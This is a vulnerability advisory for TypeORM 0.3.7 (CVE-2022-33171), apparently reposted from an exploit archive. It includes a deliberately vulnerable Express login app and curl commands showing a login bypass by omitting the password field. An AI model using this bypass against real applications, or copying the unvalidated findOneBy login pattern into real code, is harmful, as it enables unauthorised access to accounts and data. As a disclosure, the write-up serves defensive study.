@@ -1,0 +1,91 @@
+id: 37912
+date: 08/16/2022
+title: TypeORM 0.3.7 Information Disclosure Vulnerability
+author: Andrii Kostenko
+cves: CVE-2022-33171
+
+I found what I think is a vulnerability in the latest typeorm 0.3.7.
+TypeORM v0.3 has a new findOneBy method instead of findOneById() and it is
+the only way to get a record by id
+
+Sending undefined as a value in this method removes this parameter from the
+query. This leads to the data exposure.
+
+For example:
+Users.findOneBy({id: req.query.id}) with /?id=12345 produces SELECT * FROM
+Users WHERE id=12345 LIMIT 1 while removing id from the query string
+produces SELECT * FROM Users LIMIT 1
+
+Maintainer also does not consider this a vulnerability and stated the
+root cause is bad input validation. I tried to contact Snyk, but they
+took the author's position. I still think it is a major vulnerability
+
+
+Vulnerable app:
+
+
+import {
+  Entity,
+  PrimaryGeneratedColumn,
+  Column,
+  Connection,
+  ConnectionOptions,
+  Repository,
+  createConnection
+} from 'typeorm';
+import express from 'express';
+import {Application, Request, Response} from 'express';
+
+let connection: Connection;
+
+async function myListener(request: Request, response: Response) {
+  if(!connection)
+    connection = await createConnection(connectionOpts);
+  const userRepo: Repository<User> = connection.getRepository(User);
+
+  const { email, password }: Record<string, string> = request.body;
+  const user = await userRepo.findOneBy({ email, password });
+  return response.json(user ? 'ok' : 'denied');
+}
+
+@Entity({ name: 'Users' })
+class User {
+    @PrimaryGeneratedColumn()
+    id!: number;
+    @Column()
+    email!: string;
+    @Column()
+    password!: string;
+}
+
+const connectionOpts: ConnectionOptions = {
+  type: 'mysql',
+  name: 'myconnection',
+  host: 'localhost',
+  username: 'root',
+  password: 'test123',
+  database: 'domurl',
+  entities: [User]
+}
+
+const app: Application = express();
+app.use(express.json());
+app.post( "/authenticate", myListener);
+app.listen(4444, () => console.log('App started'));
+
+
+Usage:
+
+curl http://127.0.0.1:4444/authenticate -H 'Content-Type:
+application/json' --data '{"email": "Flo64@yahoo.com", "password":
+"incorrect"}'
+"denied"⏎
+
+
+Exploit:
+
+curl http://127.0.0.1:4444/authenticate -H 'Content-Type:
+application/json' --data '{"email": "Flo64@yahoo.com"}'
+"ok"⏎
+
+#  0day.today [2023-03-24]  #
